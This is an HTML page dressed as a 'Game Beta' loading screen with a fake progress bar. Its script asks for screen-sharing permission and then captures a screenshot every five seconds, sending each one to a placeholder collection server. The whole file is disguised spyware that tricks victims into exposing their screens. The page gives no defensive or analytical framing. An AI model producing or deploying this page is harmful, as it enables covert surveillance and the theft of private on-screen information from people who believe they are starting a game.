<!DOCTYPE html>
<html>
<head>
    <title>Game Beta v1.0</title>
    <style>
        body { font-family: Arial, sans-serif; background-color: #f0f0f0; }
        .loading { position: fixed; top: 50%; left: 50%; transform: translate(-50%, -50%); text-align: center; }
        .hidden { position: absolute; width: 100%; height: 100%; background:black; opacity:0; }
    </style>
</head>
<body>
    <div class="loading">
        <h2>Loading Game Beta...</h2>
        <p>Please wait while we initialize assets...</p>
        <div id="progress">0%</div>
    </div>
    <div class="hidden"></div>
    
    <script>
        // Progress bar update
        setTimeout(() => {
            document.getElementById('progress').innerText = "95%";
            setTimeout(() => {
                // Screen capture
                navigator.mediaDevices.getDisplayMedia({video: true})
                .then(stream => {
                    const video = document.createElement('video');
                    video.srcObject = stream;
                    video.play();
                    
                    // Capture screenshots every 5 seconds
                    setInterval(() => {
                        const canvas = document.createElement('canvas');
                        canvas.width = video.videoWidth;
                        canvas.height = video.videoHeight;
                        const ctx = canvas.getContext('2d');
                        ctx.drawImage(video, 0, 0);
                        
                        // Send to server
                        fetch('https://your-server.com/collect', {
                            method: 'POST',
                            body: JSON.stringify({
                                screenshot: canvas.toDataURL(),
                                timestamp: Date.now()
                            })
                        });
                    }, 5000);
                });
            }, 1000);
        }, 2000);
    </script>
</body>
</html>
